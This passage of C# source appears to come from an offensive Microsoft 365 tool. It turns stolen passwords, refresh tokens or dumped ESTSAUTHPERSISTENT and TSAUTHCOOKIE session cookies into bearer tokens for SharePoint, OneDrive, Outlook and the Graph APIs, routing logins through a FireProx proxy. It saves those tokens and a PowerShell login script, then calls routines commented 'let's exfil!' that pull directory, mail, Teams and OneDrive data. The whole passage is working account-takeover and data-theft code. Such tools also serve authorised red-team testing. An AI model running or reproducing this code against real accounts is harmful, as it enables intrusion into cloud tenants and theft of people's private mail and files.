            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) outlookToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) msGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) adGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });

            if (exifilOptions.Tokens)
            {

                if (!string.IsNullOrEmpty(companySharePointUrl))
                    companySharePointToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(companySharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));

                if (!string.IsNullOrEmpty(personalSharePointUrl))
                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));

                outlookToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://outlook.office365.com", "d3590ed6-52b3-4102-aeff-aad2292ab01c"));

                msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.microsoft.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));

                adGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.windows.net", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));

                var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
                Directory.CreateDirectory(bearerTokensOutPath);

                File.WriteAllText(Path.Combine(bearerTokensOutPath, "TeamsToken.txt"), JsonConvert.SerializeObject(inputToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "AdGraphToken.txt"), JsonConvert.SerializeObject(adGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "MsGraphToken.txt"), JsonConvert.SerializeObject(msGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OutlookToken.txt"), JsonConvert.SerializeObject(outlookToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OneDriveToken.txt"), JsonConvert.SerializeObject(personalOneDriveToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "SharePointToken.txt"), JsonConvert.SerializeObject(companySharePointToken.bearerToken, Formatting.Indented));

                if (!string.IsNullOrEmpty(adGraphToken.bearerToken?.access_token) && !string.IsNullOrEmpty(msGraphToken.bearerToken?.access_token))
                    File.WriteAllText(Path.Combine(bearerTokensOutPath, "loginAAD.ps1"), $"$AadToken=\"{adGraphToken.bearerToken.access_token}\"\n$MsgToken=\"{msGraphToken.bearerToken.access_token}\"\nConnect-MsolService -AdGraphAccessToken $AadToken -MsGraphAccessToken $MsgToken -AzureEnvironment 'AzureCloud'");

            }


            if (exifilOptions.AAD)
            {
                //Get the tokens needed if we don't already have them
                if (adGraphToken.bearerToken?.access_token == null)
                    adGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.windows.net", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.microsoft.com", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));


                //Did we get them, if so let's exfil!
                if (adGraphToken.bearerToken?.access_token != null)
                    await AdGraphExfilAsync(adGraphToken.bearerToken, baseUserOutPath);

                if (msGraphToken.bearerToken?.access_token != null)
                    await MsGraphExfilAsync(msGraphToken.bearerToken, baseUserOutPath);
            }

            if (exifilOptions.OWA)
            {
                //Get the tokens neede if we don't already have them
                if (outlookToken.bearerToken?.access_token == null)
                    outlookToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://outlook.office365.com", "d3590ed6-52b3-4102-aeff-aad2292ab01c"));

                //Did we get them, if so let's exfil!
                if (outlookToken.bearerToken?.access_token != null)
                    await OWAExfilAsync(outlookToken.bearerToken, baseUserOutPath);

                // File.WriteAllText(Path.Combine(outlookOutPath, "Emails.json"), JsonConvert.SerializeObject(allEmails, Formatting.Indented));
            }

            if (exifilOptions.Teams)
            {
                //Get the tokens neede if we don't already have them
                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));

                //Did we get them, if so let's exfil!
                if (inputToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
                    await TeamsExfilAsync(inputToken, personalOneDriveToken.bearerToken, baseUserOutPath);

            }

            if (exifilOptions.OneDrive)
            {

                //Get the tokens neede if we don't already have them
                if (companySharePointToken.bearerToken?.access_token == null)
                    companySharePointToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(companySharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));

                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://" + new Uri(personalSharePointUrl).Host, "1b730954-1685-4b74-9bfd-dac224a7b894"));


                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.LoginAttemptFireProx(usernameCreds, passwordCreds, _globalProperties.GetFireProxURL(), ("https://graph.microsoft.com/", "1fec8e78-bce4-4aaf-ab1b-5451cc387264"));


                //Did we get them, if so let's exfil!
                if (msGraphToken.bearerToken != null && companySharePointToken.bearerToken != null && inputToken != null)
                    await OneDriveExfilAsync(companySharePointToken.bearerToken, msGraphToken.bearerToken, inputToken, personalOneDriveToken.bearerToken, baseUserOutPath);

            }

        }
        private static async Task RefreshExfilAccountAsync(string outpath, BearerTokenResp teamsToken, ExifilOptions exifilOptions, MSOLHandler msolHandler)
        {


            TeamsHandler teamsHandler = new TeamsHandler(teamsToken, _globalProperties);

            List<GetTenatsResp> tenantInfo = await teamsHandler.GetTenantsInfo();
            FilesAvailabilityResp sharePointInfo = await teamsHandler.GetSharePointInfo();

            string username = Helpers.Generic.GetUsername(teamsToken.access_token);

            var baseUserOutPath = Path.Combine(outpath, Helpers.Generic.MakeValidFileName(username));
            Directory.CreateDirectory(baseUserOutPath);

            File.WriteAllText(Path.Combine(baseUserOutPath, "Tenant.json"), JsonConvert.SerializeObject(tenantInfo, Formatting.Indented));
            File.WriteAllText(Path.Combine(baseUserOutPath, "SharePoint.json"), JsonConvert.SerializeObject(sharePointInfo, Formatting.Indented));


            string companySharePointUrl = "";
            string personalSharePointUrl = "";

            if (sharePointInfo?.personalRootFolderUrl == null)
            {
                _databaseHandler.WriteLog(new Log("EXFIL", $"User has not been configured / licensed for o365, skipping OneDrive/SharePoint", "") { }, true);

                sharePointInfo = new FilesAvailabilityResp();
                sharePointInfo.personalRootFolderUrl = "invalid";
                exifilOptions.OneDrive = false;

            }
            else
            {
                companySharePointUrl = sharePointInfo.personalRootFolderUrl.Replace("-my", "");
                personalSharePointUrl = sharePointInfo.personalRootFolderUrl;
            }

            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) companySharePointToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) personalOneDriveToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) outlookToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) msGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) adGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });

            if (exifilOptions.Tokens)
            {
                companySharePointToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), companySharePointUrl);

                personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);

                outlookToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://outlook.office365.com");

                //(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) azurePSToken = await MSOLHandler.RefreshAttempt(teamsToken.TokenResp, "https://management.core.windows.net/");

                msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.microsoft.com");

                adGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.windows.net");


                var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
                Directory.CreateDirectory(bearerTokensOutPath);

                File.WriteAllText(Path.Combine(bearerTokensOutPath, "TeamsToken.txt"), JsonConvert.SerializeObject(teamsToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "AdGraphToken.txt"), JsonConvert.SerializeObject(adGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "MsGraphToken.txt"), JsonConvert.SerializeObject(msGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OutlookToken.txt"), JsonConvert.SerializeObject(outlookToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OneDriveToken.txt"), JsonConvert.SerializeObject(personalOneDriveToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "SharePointToken.txt"), JsonConvert.SerializeObject(companySharePointToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "loginAAD.ps1"), $"$AadToken=\"{adGraphToken.bearerToken.access_token}\"\n$MsgToken=\"{msGraphToken.bearerToken.access_token}\"\nConnect-MsolService -AdGraphAccessToken $AadToken -MsGraphAccessToken $MsgToken -AzureEnvironment 'AzureCloud'");

            }


            if (exifilOptions.AAD)
            {
                //Get the tokens needed if we don't already have them
                if (adGraphToken.bearerToken?.access_token == null)
                    adGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.windows.net");

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.microsoft.com");


                //Did we get them, if so let's exfil!
                if (adGraphToken.bearerToken?.access_token != null)
                    await AdGraphExfilAsync(adGraphToken.bearerToken, baseUserOutPath);

                if (msGraphToken.bearerToken?.access_token != null)
                    await MsGraphExfilAsync(msGraphToken.bearerToken, baseUserOutPath);
            }

            if (exifilOptions.OWA)
            {
                //Get the tokens neede if we don't already have them
                if (outlookToken.bearerToken?.access_token == null)
                    outlookToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://outlook.office365.com");

                //Did we get them, if so let's exfil!
                if (outlookToken.bearerToken?.access_token != null)
                    await OWAExfilAsync(outlookToken.bearerToken, baseUserOutPath);

                // File.WriteAllText(Path.Combine(outlookOutPath, "Emails.json"), JsonConvert.SerializeObject(allEmails, Formatting.Indented));
            }

            if (exifilOptions.Teams)
            {
                //Get the tokens neede if we don't already have them
                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);

                //Did we get them, if so let's exfil!
                if (teamsToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
                    await TeamsExfilAsync(teamsToken, personalOneDriveToken.bearerToken, baseUserOutPath);




            }

            if (exifilOptions.OneDrive)
            {

                //Get the tokens neede if we don't already have them
                if (companySharePointToken.bearerToken?.access_token == null)
                    companySharePointToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), companySharePointUrl);

                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), personalSharePointUrl);

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.RefreshAttempt(teamsToken, _globalProperties.GetFireProxURL(), "https://graph.microsoft.com");


                //Did we get them, if so let's exfil!
                if (msGraphToken.bearerToken != null && companySharePointToken.bearerToken != null && teamsToken != null)
                    await OneDriveExfilAsync(companySharePointToken.bearerToken, msGraphToken.bearerToken, teamsToken, personalOneDriveToken.bearerToken, baseUserOutPath);

            }

        }
        private static async Task CookieExfilAccountAsync(string outpath, List<CookieObject> cookieObjects, ExifilOptions exifilOptions, MSOLHandler msolHandler)
        {
            //Check to confirm that we have the coookies we need
            if (!cookieObjects.Select(cookie => cookie.name).Contains("TSAUTHCOOKIE") && !cookieObjects.Select(cookie => cookie.name).Contains("ESTSAUTHPERSISTENT"))
            {
                Console.WriteLine("[+] Could not found required cookies in dump, TSAUTHCOOKIE and ESTSAUTHPERSISTENT");
            }

            //Extract the information we need from the dump
            string jwtToken = cookieObjects.Where(x => x.name.Equals("TSAUTHCOOKIE")).FirstOrDefault().value;
            string tenantId = Helpers.Generic.GetTenantId(jwtToken);
            string cookie = "ESTSAUTHPERSISTENT=" + cookieObjects.Where(x => x.name.Equals("ESTSAUTHPERSISTENT")).FirstOrDefault().value;

            //Get the team's access token
            var teamsToken = (await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), targetResource: "https://api.spaces.skype.com")).bearerToken;

            TeamsHandler teamsHandler = new TeamsHandler(teamsToken, _globalProperties);

            List<GetTenatsResp> tenantInfo = await teamsHandler.GetTenantsInfo();
            FilesAvailabilityResp sharePointInfo = await teamsHandler.GetSharePointInfo();

            string username = Helpers.Generic.GetUsername(teamsToken.access_token);

            var baseUserOutPath = Path.Combine(outpath, Helpers.Generic.MakeValidFileName(username));
            Directory.CreateDirectory(baseUserOutPath);

            File.WriteAllText(Path.Combine(baseUserOutPath, "Tenant.json"), JsonConvert.SerializeObject(tenantInfo, Formatting.Indented));
            File.WriteAllText(Path.Combine(baseUserOutPath, "SharePoint.json"), JsonConvert.SerializeObject(sharePointInfo, Formatting.Indented));


            string companySharePointUrl = "";
            string personalSharePointUrl = "";

            if (sharePointInfo?.personalRootFolderUrl == null)
            {
                _databaseHandler.WriteLog(new Log("EXFIL", $"User has not been configured / licensed for o365, skipping OneDrive/SharePoint", "") { }, true);

                sharePointInfo = new FilesAvailabilityResp();
                sharePointInfo.personalRootFolderUrl = "invalid";
                exifilOptions.OneDrive = false;

            }
            else
            {
                companySharePointUrl = sharePointInfo.personalRootFolderUrl.Replace("-my", "");
                personalSharePointUrl = sharePointInfo.personalRootFolderUrl;
            }

            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) companySharePointToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) personalOneDriveToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) outlookToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) msGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) adGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });

            if (exifilOptions.Tokens)

            {


                //teamsToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, targetResource: "https://graph.windows.net", clientId: "1fec8e78-bce4-4aaf-ab1b-5451cc387264");

                companySharePointToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), targetResource: companySharePointUrl);

                personalOneDriveToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), targetResource: personalSharePointUrl);

                outlookToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), targetResource: "https://outlook.office365.com");

                //(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) azurePSToken = await MSOLHandler.RefreshAttempt(teamsToken.TokenResp, "https://management.core.windows.net/");

                msGraphToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), targetResource: "https://graph.microsoft.com");

                adGraphToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), targetResource: "https://graph.windows.net");


                var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
                Directory.CreateDirectory(bearerTokensOutPath);

                File.WriteAllText(Path.Combine(bearerTokensOutPath, "TeamsToken.txt"), JsonConvert.SerializeObject(teamsToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "AdGraphToken.txt"), JsonConvert.SerializeObject(adGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "MsGraphToken.txt"), JsonConvert.SerializeObject(msGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OutlookToken.txt"), JsonConvert.SerializeObject(outlookToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OneDriveToken.txt"), JsonConvert.SerializeObject(personalOneDriveToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "SharePointToken.txt"), JsonConvert.SerializeObject(companySharePointToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "loginAAD.ps1"), $"$AadToken=\"{adGraphToken.bearerToken.access_token}\"\n$MsgToken=\"{msGraphToken.bearerToken.access_token}\"\nConnect-MsolService -AdGraphAccessToken $AadToken -MsGraphAccessToken $MsgToken -AzureEnvironment 'AzureCloud'");

            }


            if (exifilOptions.AAD)
            {
                //Get the tokens needed if we don't already have them
                if (adGraphToken.bearerToken?.access_token == null)
                    adGraphToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), "https://graph.windows.net");

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");


                //Did we get them, if so let's exfil!
                if (adGraphToken.bearerToken?.access_token != null)
                    await AdGraphExfilAsync(adGraphToken.bearerToken, baseUserOutPath);

                if (msGraphToken.bearerToken?.access_token != null)
                    await MsGraphExfilAsync(msGraphToken.bearerToken, baseUserOutPath);
            }

            if (exifilOptions.OWA)
            {
                //Get the tokens neede if we don't already have them
                if (outlookToken.bearerToken?.access_token == null)
                    outlookToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), "https://outlook.office365.com");

                //Did we get them, if so let's exfil!
                if (outlookToken.bearerToken?.access_token != null)
                    await OWAExfilAsync(outlookToken.bearerToken, baseUserOutPath);

                // File.WriteAllText(Path.Combine(outlookOutPath, "Emails.json"), JsonConvert.SerializeObject(allEmails, Formatting.Indented));
            }

            if (exifilOptions.Teams)
            {
                //Get the tokens neede if we don't already have them
                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), personalSharePointUrl);

                //Did we get them, if so let's exfil!
                if (teamsToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
                    await TeamsExfilAsync(teamsToken, personalOneDriveToken.bearerToken, baseUserOutPath);




            }

            if (exifilOptions.OneDrive)
            {

                //Get the tokens neede if we don't already have them
                if (companySharePointToken.bearerToken?.access_token == null)
                    companySharePointToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), companySharePointUrl);

                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), personalSharePointUrl);

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.CookieGetAccessToken(tenantId, cookie, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com");


                //Did we get them, if so let's exfil!
                if (msGraphToken.bearerToken != null && companySharePointToken.bearerToken != null && cookie != null)
                    await OneDriveExfilAsync(companySharePointToken.bearerToken, msGraphToken.bearerToken, teamsToken, personalOneDriveToken.bearerToken, baseUserOutPath);

            }

        }

    }
}
